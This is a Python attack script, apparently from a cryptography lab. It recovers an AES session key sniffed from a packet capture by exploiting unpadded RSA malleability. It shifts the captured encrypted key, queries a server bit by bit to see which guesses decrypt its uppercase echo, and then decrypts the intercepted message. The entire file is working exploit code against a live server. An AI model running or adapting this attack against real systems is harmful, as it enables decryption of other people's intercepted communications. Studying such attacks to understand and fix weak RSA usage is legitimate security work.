import argparse
import socket
import os
import time
from aes import AESCipher
from Crypto.PublicKey import RSA

# Handle command-line arguments
parser = argparse.ArgumentParser()
parser.add_argument("-ip", "--ipaddress",
                    help='ip address where the server is running',
                    required=True)
parser.add_argument("-p", "--port",
                    help='port where the server is listening on',
                    required=True)
parser.add_argument("-m", "--message",
                    help='message to send to the server',
                    required=True)
args = parser.parse_args()

serverPublicKeyFileName = "serverPublicKey"
key = ""
with open(serverPublicKeyFileName, 'r') as f:
    key = RSA.importKey(f.read())

MESSAGE_LENGTH = 2048

bitsToShift = 255

# Cipher text extracted from pcap captured using Wireshark
cipherText = bytearray.fromhex('b035ed0d5b0074fb30972a54923e60a6614c2cd1796d8d06e9fcd91a0454a6841a428676fd39cdf9619436d396ce2bd6aa56b8c02777539312398d4d00c06a1849d44f7e730948d09c0c483ded87c6ee4804b2ef4ce1bf6d3bb6c43a1d00ff22f05aabe1c0cb132ef42d61d02a73d1e1b519c1cfc08a663a674dbf6f0afddb0beda435f69ac2d8cd2eadafb84da14562a1a3504ce5e8a0f245235ce024535a0b4168dfdb8931f8035ea4457e51145d3d1a5d7a3cf3f3220c47912ffa7a0a4c04ffd7eedd881cc1eda5fca220174512b996c483c0a02ded5ea816b6818f81bfae4c31ba8331ec217ec8f77e979814c622b54f039f9e142f37947b622bd37f70253022bffcd87a554df819d2f564bc3e8c5c59666338d4e8b3892185b55028b7ea0d44a195b32976aacdfe527978dbcb1599386b10116c007ed538344f5340c3fa20baf9cf3a92684c160199da9f203507f1da12766a0d6779d9470d70f07ab3304a5e2bfc8b6b2c47f7293930aa7302ee0167689b636f1c966b45a8e6cadb88e5b767174ead6e108729fd8350813db687')

encryptedAESKey = cipherText[:256]
encryptedMessage = cipherText[256:]

recoveredAESBits = list()

aesGuess0 = list(0 for i in range(256))
aesGuess1 = list(0 for i in range(256))

# Converting the encrypted AES key into a number to manipulate 
encryptedAESKey = int.from_bytes(encryptedAESKey, byteorder = 'big', signed = False)

iteration = 0

# So long as we have not recovered the AES key, we will continue to
# guess for it. First we will gues with leading 0, then with a leading 1.
# We will continously connect to the server until we recover the full
# 256 bit AES key
while len(recoveredAESBits) != 256:
    print("Iteration", iteration, ":")

    print("Shifting encrypted AES key by", bitsToShift, "bits")

    # For every even iteration, we will add an a new bit to the
    # guesses
    if iteration % 2 == 0:
        for i in range(len(recoveredAESBits)):
            aesGuess0[i] = recoveredAESBits[i]
            aesGuess1[i] = recoveredAESBits[i]

        aesGuess0.insert(0, 0)
        aesGuess1.insert(0, 1)

    aesGuess0 = aesGuess0[:256]
    aesGuess1 = aesGuess1[:256]

    # Turning the list of bits into bytes for them to be processed for the AESCipher
    aesGuess0Str = ''.join(map(str, aesGuess0))
    aesGuess1Str = ''.join(map(str, aesGuess1))

    aesGuess0Bytes = bytes(int(aesGuess0Str[i : i + 8], 2) for i in range(0, len(aesGuess0Str), 8))
    aesGuess1Bytes = bytes(int(aesGuess1Str[i : i + 8], 2) for i in range(0, len(aesGuess1Str), 8))

    # Encrypting 2^b, where b is the bits to shift, with the server public key and then multiply it by the encrypted AES
    # key in order to shift the encrypted AES key by b
    shiftedAESKey = encryptedAESKey * (2 ** (bitsToShift * key.e) % key.n) % key.n
    shiftedAESKey = shiftedAESKey.to_bytes(256, byteorder = 'big')
    
    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect the socket to the port where the server is listening
    server_address = (args.ipaddress, int(args.port))
    sock.connect(server_address)
    sock.settimeout(2)

    print("Recovered AES Bits", recoveredAESBits)

    try:
        if iteration % 2 == 0:
           print("Guessing AES key with leading 0 bit")
           print("Using temporary AES Key {}".format(aesGuess0Bytes.hex()))
           print("Temporary AES key in bits:", aesGuess0Str)
           aes = AESCipher(aesGuess0Bytes)
        else:
           print("Guessing AES key with leading 1 bit")
           print("Using temporary AES Key {}".format(aesGuess1Bytes.hex()))
           print("Temporary AES key in bits:", aesGuess1Str)
           aes = AESCipher(aesGuess1Bytes)
           
        # Send data
        try:
            message = aes.encrypt(args.message)
        except ValueError:
            print("Client with port {} failed.".format(args.port))
            exit(1)

        msg = shiftedAESKey + message

        print('Sending: {}'.format(message.hex()))

        # msg: AES key encrypted by the public key of RSA
        #      + message encrypted by the AES key
        sock.sendall(msg)

        # Look for the response
        amount_received = 0
        amount_expected = len(message)

        if amount_expected % 16 != 0:
            amount_expected += (16 - (len(message) % 16))
        
        answer = b''
        if amount_expected > amount_received:
            while amount_received < amount_expected:
                try:
                    data = sock.recv(MESSAGE_LENGTH)
                except socket.timeout as e:
                    err = e.args[0]

                    if err == 'timed out':
                        print('Connection timed out, waiting for retry')
                        time.sleep(1)
                        continue
                    else:
                        print('Another issue: {}'.format(e))
                        break
                except socket.error as e:
                    print('Socket error: {}'.format(e))
                    break
                amount_received += len(data)
                answer += data

        # Getting what the server responded with and what we expected
        serverResponse = aes.decrypt(answer)
        expectedResponse = aes.decrypt(aes.encrypt((args.message).upper()))

        print("Server Response:", serverResponse)
        print("Expected Answer:", expectedResponse)

        # If the server response with what we expected (a capatalized version of our message we sent),
        # we will add the appropiate bit to the recovered AES bit list and continue on.
        if serverResponse.hex() == expectedResponse.hex():
            print("Successfully Decrypted!")

            if iteration % 2 == 0:
                recoveredAESBits.insert(0,0)
            else:
                recoveredAESBits.insert(0,1)
        else:
            print("Failed to Decrypt")

        # After trying both posible bits, we will move on to shifting one
        # less bit
        if iteration % 2 != 0:
            bitsToShift -= 1
        
        iteration += 1

        print("\n")

        time.sleep(2)
    finally:
        sock.close()

# We have finally gotten all bits of the AES key we sniffed from the pcap. We will
# process it into bytes to use as the key for the AESCipher
recoveredAESBitsStr = ''.join(map(str, recoveredAESBits))

decryptedAES = bytes(int(recoveredAESBitsStr[i : i + 8], 2) for i in range(0, len(aesGuess0Str), 8))

aes = AESCipher(decryptedAES)

# Decrypting our encrypted Message with the AES we found
decryptedMessage = aes.decrypt(bytes(encryptedMessage))

print("Successfully Recovered the AES key!")
print("Recovered AES Session Key:", int.from_bytes(decryptedAES, byteorder = 'big', signed = False))
print("Recovered AES key in bits:", recoveredAESBitsStr)
print("Decrypted Message:", decryptedMessage)
